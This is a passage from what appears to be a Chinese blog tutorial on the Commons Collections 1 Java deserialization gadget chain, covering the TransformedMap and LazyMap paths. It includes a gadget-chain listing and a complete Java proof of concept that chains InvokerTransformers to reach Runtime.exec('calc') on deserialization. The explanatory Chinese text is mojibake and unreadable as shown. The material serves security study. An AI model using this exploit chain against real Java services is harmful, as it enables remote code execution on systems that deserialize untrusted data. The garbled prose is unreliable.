</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><code>AnnotationInvocationHandler.memberValues</code>æˆ‘ä»¬ä¼ å…¥çš„æ˜¯<code>TransformedMap</code>,å…¶æœ‰ä¸ª<code>decorate</code>æ–¹æ³•å¯ä»¥è°ƒç”¨è‡ªæ„æ–¹æ³•ï¼Œè¿”å›å…¶å¯¹è±¡ï¼Œä¸»è¦ç•™æ„<code>map</code>å’Œ<code>valueTransformer</code></p>
<p><img loading="lazy" src="../images/image-20241106175027952.png" alt="image-20241106175027952"  />
</p>
<p>ç„¶åæˆ‘ä»¬çœ‹<code>AnnotationInvocationHandler.readObject</code>çš„<code>memberValues#entrySet</code>æ–¹æ³•</p>
<p><img loading="lazy" src="../images/image-20241106175221470.png" alt="image-20241106175221470"  />
</p>
<p>è¿™é‡Œä¼šè·³åˆ°<code>AbstractInputCheckedMapDecorator#entrySet</code>ï¼ŒTransformedMapæ²¡è¿™ä¸ªæ–¹æ³•è°ƒç”¨å…¶çˆ¶ç±»çš„ï¼Œä½†æ˜¯è¿™é‡Œ<code>isSetValueChecking</code>æ˜¯è°ƒç”¨TransformedMapè‡ªå·±ï¼Œåˆ¤æ–­<code>valueTransformer</code>æ˜¯å¦æœ‰å€¼ï¼Œæœ‰å€¼=&gt;<code>true</code>ï¼Œè¿™é‡Œè¿›å…¥if</p>
<p><img loading="lazy" src="../images/image-20241106182858148.png" alt="image-20241106182858148"  />
</p>
<p><img loading="lazy" src="../images/image-20241106183021300.png" alt="image-20241106183021300"  />
</p>
<p>è¿™é‡Œä¸»è¦æ˜¯<code>map#entrySet()</code>ï¼Œè¿™é‡Œmapå¾—æœ‰å€¼readObjectæ‰èƒ½è¿›å…¥forï¼Œè¿™é‡Œ<code>map</code>æ¥è‡ª<code>TransformedMap</code>åˆå§‹åŒ–è°ƒç”¨superä¼ å…¥çš„</p>
<p><img loading="lazy" src="../images/image-20241106183705846.png" alt="image-20241106183705846"  />
</p>
<p>ä¼šå†™åˆ°<code>AbstractMapDecorator</code>çš„<code>this.map</code>ä¸­ï¼Œè€Œ<code>AbstractInputCheckedMapDecorator</code>ç»§æ‰¿<code>AbstractMapDecorator</code>ä¸”æ­¤ç±»ä¸­æ²¡è‡ªå®šä¹‰mapè¿™ä¸ªå±æ€§ï¼Œæ‰€ä»¥è¿™é‡Œè°ƒç”¨çš„æ˜¯<code>AbstractMapDecorator.map</code>åŠ<code>TransformedMap</code>åˆå§‹åŒ–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬ä¸èƒ½è®©å…¶sizeä¸º0ï¼Œæ‰€ä»¥pocä¸­è¦ç»™å…¶putä¸€ä¸ªå€¼</p>
<h5 id="ç–‘é—®2-value">ç–‘é—®2 value<a hidden class="anchor" aria-hidden="true" href="#ç–‘é—®2-value">#</a></h5>
<p>ä¸ºä»€ä¹ˆputçš„keyè¦æ˜¯<code>value</code></p>
<p><img loading="lazy" src="../images/image-20241106184425628.png" alt="image-20241106184425628"  />
</p>
<p><img loading="lazy" src="../images/image-20241106184659102.png" alt="image-20241106184659102"  />
</p>
<p><strong>è§£ç­”ï¼š</strong></p>
<p>è¿™é‡Œæˆ‘ä»¬è¦è¿›å…¥ifï¼Œ<code>memberType</code>ä¸èƒ½ä¸º<code>null</code>ï¼Œ<code>memberTypes</code>ç›¸å½“äºmapï¼Œè€Œ<code>memberTypes</code>çš„å€¼æˆ‘ä»¬å¯ä»¥å‘ç°æ˜¯è·å–typeä¸­çš„<code>æ–¹æ³•</code>(å…·ä½“å¯ä»¥çœ‹ä¸‹é¢typeçš„åˆ†æ)ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©çš„æ˜¯<code>Target.class</code>å…¶ä¸­æ–¹æ³•åªæœ‰ä¸€ä¸ª<code>valueæ–¹æ³•</code>ï¼Œ<code>memberTypes.key</code>åˆ™æ˜¯<code>æ–¹æ³•åå­—</code>ï¼Œnameæ˜¯è·å–æˆ‘ä»¬è®¾ç½®hashmapä¸­keyï¼Œæ‰€ä»¥keyå¿…é¡»æ˜¯value</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Documented</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@Retention</span><span class="p">(</span><span class="n">RetentionPolicy</span><span class="p">.</span><span class="na">RUNTIME</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@Target</span><span class="p">(</span><span class="n">ElementType</span><span class="p">.</span><span class="na">ANNOTATION_TYPE</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="nd">@interface</span><span class="w"> </span><span class="n">Target</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ElementType</span><span class="o">[]</span><span class="w"> </span><span class="nf">value</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>å¾€ä¸‹åˆ°<code>memberValue.setValue</code>ï¼ŒmemberValueçš„å€¼ä¸º<code>AbstractInputCheckedMapDecorator$MapEntry</code></p>
<p><img loading="lazy" src="../images/image-20241106185250809.png" alt="image-20241106185250809"  />
</p>
<p><code>AbstractInputCheckedMapDecorator#setValue</code></p>
<p><img loading="lazy" src="../images/image-20241106185718686.png" alt="image-20241106185718686"  />
</p>
<h5 id="ç–‘é—®3-parent">ç–‘é—®3 parent<a hidden class="anchor" aria-hidden="true" href="#ç–‘é—®3-parent">#</a></h5>
<p>è¿™é‡Œ<code>parent</code>æ˜¯åœ¨readobjecté‡Œè°ƒç”¨<code>entrySet</code>ä¸­çš„<code>EntrySet</code>å†™å…¥çš„ï¼Œè¿™é‡Œthisè¿˜æ˜¯<code>TransformedMap</code>ï¼Œç„¶å<code>EntrySet</code>è¦†å†™<code>parent</code></p>
<p><img loading="lazy" src="../images/image-20241106190439226.png" alt="image-20241106190439226"  />
</p>
<p><img loading="lazy" src="../images/image-20241106190522464.png" alt="image-20241106190522464"  />
</p>
<p>æœ€ååˆ°<code>checkSetValue</code>æ–¹æ³•è°ƒç”¨<code>transform</code>ï¼ŒæˆåŠŸåˆ©ç”¨ï¼ï¼</p>
<p><img loading="lazy" src="../images/image-20241106185910829.png" alt="image-20241106185910829"  />
</p>
<h5 id="å­˜æ¡£1-type">å­˜æ¡£1 type<a hidden class="anchor" aria-hidden="true" href="#å­˜æ¡£1-type">#</a></h5>
<p>æˆ‘ä»¬è¦ä¿è¯readObjectä¸­<code>annotationType = AnnotationType.getInstance(type);</code><strong>ä¸æŠ¥é”™</strong></p>
<p>å½’æ ¹å°±æ˜¯çœ‹æˆ‘ä»¬ä¼ å…¥çš„classæ˜¯ä¸æ˜¯ç»§æ‰¿Annotationï¼ˆ<strong>å…¶å®å°±æ˜¯åˆ¤æ–­æ˜¯ä¸æ˜¯æ³¨è§£ç±»å‹</strong>ï¼‰</p>
<p><img loading="lazy" src="../images/image-20241107093212278.png" alt="image-20241107093212278"  />
</p>
<p>ä½†æ˜¯Annotationä¸èƒ½ç›´æ¥ç»§æ‰¿</p>
<p><img loading="lazy" src="../images/image-20241107093251696.png" alt="image-20241107093251696"  />
</p>
<blockquote>
<p><strong>å…³äº<code>java.lang.annotation.Annotation</code>æ¥å£çš„æ€§è´¨</strong></p>
<ol>
<li><strong>æ˜¯æ‰€æœ‰æ³¨è§£ç±»å‹çš„é€šç”¨æ¥å£</strong>ï¼š
<ul>
<li>è¿™æ„å‘³ç€æ‰€æœ‰è‡ªå®šä¹‰çš„æ³¨è§£ç±»å‹åœ¨åº•å±‚éƒ½ä¸è¿™ä¸ªæ¥å£æœ‰ä¸€å®šçš„å…³è”ï¼Œä½†ä¸æ˜¯é€šè¿‡ä¼ ç»Ÿçš„ç»§æ‰¿æ–¹å¼å»ºç«‹è¿™ç§å…³è”ã€‚</li>
<li>å®ƒä¸ºæ³¨è§£ç±»å‹æä¾›äº†ä¸€äº›å…±åŒçš„è¡Œä¸ºè§„èŒƒï¼Œä½†æœ¬èº«å¹¶ä¸ç›´æ¥å®šä¹‰ä¸€ä¸ªå…·ä½“çš„æ³¨è§£ã€‚</li>
</ul>
</li>
<li>ä¸èƒ½é€šè¿‡æ‰‹åŠ¨ç»§æ‰¿æ¥å®šä¹‰æ³¨è§£ç±»å‹ï¼š
<ul>
<li>å¦‚æœä¸€ä¸ªæ™®é€šçš„æ¥å£å»ç»§æ‰¿è¿™ä¸ª<code>Annotation</code>æ¥å£ï¼Œä¸èƒ½å°†å…¶å˜ä¸ºä¸€ä¸ªæ³¨è§£ç±»å‹ã€‚æ³¨è§£ç±»å‹å¿…é¡»é€šè¿‡ç‰¹å®šçš„æ–¹å¼ï¼ˆä½¿ç”¨<code>@interface</code>å…³é”®å­—ï¼‰æ¥å®šä¹‰ï¼Œè€Œä¸æ˜¯é€šè¿‡ç»§æ‰¿è¿™ä¸ªæ¥å£ã€‚</li>
</ul>
</li>
</ol>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">annotationType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AnnotationType</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="n">type</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ä¼šè¿”å›ä¸€ä¸ªAnnotationTypeå¯¹è±¡</span><span class="err">ï¼Œ</span><span class="n">è€ŒmemberTypesåˆ™æ˜¯å­˜å‚¨æˆ‘ä»¬ä¼ å…¥classä¸­çš„æ–¹æ³•</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20241107155543539.png" alt="image-20241107155543539"  />
</p>
<p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨çš„æ¡ä»¶ï¼š</p>
<ul>
<li>æ˜¯æ³¨è§£ç±»å‹</li>
<li>å«æœ‰æ–¹æ³•</li>
<li>æ˜¯jarä¸­ç±»</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Documented</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@Inherited</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@Retention</span><span class="p">(</span><span class="n">RetentionPolicy</span><span class="p">.</span><span class="na">RUNTIME</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@Target</span><span class="p">(</span><span class="n">ElementType</span><span class="p">.</span><span class="na">TYPE</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="nd">@interface</span><span class="w"> </span><span class="n">IDProperty</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">value</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>è¿™é‡Œæˆ‘åˆæ‰¾äº†ä¸ª<code>IDProperty</code>æˆåŠŸæ‰§è¡Œå‘½ä»¤</p>
<h3 id="lazymap">LazyMap<a hidden class="anchor" aria-hidden="true" href="#lazymap">#</a></h3>
<p>azyMap çš„æ¼æ´è§¦å‘ç‚¹å’Œ TransformedMap å”¯ä¸€çš„å·®åˆ«æ˜¯ï¼ŒTransformedMap æ˜¯åœ¨å†™å…¥å…ƒç´ çš„æ—¶å€™æ‰§è¡Œ transformï¼Œè€Œ LazyMap æ˜¯åœ¨å…¶ get æ–¹æ³•ä¸­æ‰§è¡Œçš„ factory.transform ã€‚</p>
<p><strong>åˆ©ç”¨é“¾</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Gadget chain:
</span></span><span class="line"><span class="cl">    ObjectInputStream.readObject()
</span></span><span class="line"><span class="cl">        AnnotationInvocationHandler.readObject()
</span></span><span class="line"><span class="cl">            Map(Proxy).entrySet()
</span></span><span class="line"><span class="cl">                AnnotationInvocationHandler.invoke()
</span></span><span class="line"><span class="cl">                    LazyMap.get()
</span></span><span class="line"><span class="cl">                        ChainedTransformer.transform()
</span></span><span class="line"><span class="cl">                            ConstantTransformer.transform()
</span></span><span class="line"><span class="cl">                            InvokerTransformer.transform()
</span></span><span class="line"><span class="cl">                                Method.invoke()
</span></span><span class="line"><span class="cl">                                    Class.getMethod()
</span></span><span class="line"><span class="cl">                            InvokerTransformer.transform()
</span></span><span class="line"><span class="cl">                                Method.invoke()
</span></span><span class="line"><span class="cl">                                    Runtime.getRuntime()
</span></span><span class="line"><span class="cl">                            InvokerTransformer.transform()
</span></span><span class="line"><span class="cl">                                Method.invoke()
</span></span><span class="line"><span class="cl">                                    Runtime.exec()
</span></span></code></pre></div><p>LazyMap çš„ä½œç”¨æ˜¯â€œæ‡’åŠ è½½â€ï¼Œåœ¨getæ‰¾ä¸åˆ°å€¼çš„æ—¶å€™ï¼Œå®ƒä¼šè°ƒç”¨ factory.transform æ–¹æ³•å»è·å–ä¸€ä¸ªå€¼ï¼š</p>
<p><img loading="lazy" src="../images/202410062212290.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20240514204218773.png"  />
</p>
<p>ç”±äº AnnotationInvocationHandler çš„ readObject æ–¹æ³•ä¸­å¹¶æ²¡æœ‰ç›´æ¥è°ƒç”¨åˆ° Map çš„ get æ–¹æ³•ã€‚ysoserial çš„è§£å†³æ–¹æ³•æ˜¯é€šè¿‡åŠ¨æ€ä»£ç†ç”¨ AnnotationInvocationHandler ç”Ÿæˆ Proxy Map, å½“ readObject ä¸­è°ƒç”¨è¿™ä¸ª Map çš„ä»»æ„æ–¹æ³•æ—¶, è§¦å‘ä»£ç†ç±»çš„ invoke æ–¹æ³•, æ­£å¥½ AnnotationInvocationHandler invoke ä¸­è°ƒç”¨äº† get æ–¹æ³•ï¼š</p>
<p><img loading="lazy" src="../images/202410062212737.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20240514204541814.png"  />
</p>
<h4 id="pocæ„é€ ">pocæ„é€ <a hidden class="anchor" aria-hidden="true" href="#pocæ„é€ ">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.javafx.beans.IDProperty</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Factory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.annotation.PreDestroy</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Annotation</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Target</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationTargetException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Collections</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC1_LazyMap</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">constantTransformer</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">,</span><span class="n">invokerTransformer1</span><span class="p">,</span><span class="n">invokerTransformer2</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">declaredConstructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredConstructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hashmap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashmap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;value&#34;</span><span class="p">,</span><span class="n">1111</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LazyMap</span><span class="w"> </span><span class="n">lazymap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LazyMap</span><span class="p">)</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashmap</span><span class="p">,</span><span class="w"> </span><span class="n">keyTransformer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">declaredConstructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">IDProperty</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">lazymap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">declaredConstructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">IDProperty</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">map</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>è¿‡ç¨‹ä¹Ÿå¾ˆç®€å•ï¼Œè‡ªå·±ç¨å¾®è·Ÿä¸‹å°±å¥½ã€‚å”¯æœ‰æœ‰ä¸ª<code>åŠ¨æ€ä»£ç†</code>ï¼Œå¯ä»¥æœä¸‹ç›¸å…³æ–‡ç« ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ï¼Œç„¶åè¿‡ç¨‹ä¸­æœ‰ä¸ªé—®é¢˜</p>
<h5 id="é—®é¢˜3-debug">é—®é¢˜3 debug<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜3-debug">#</a></h5>
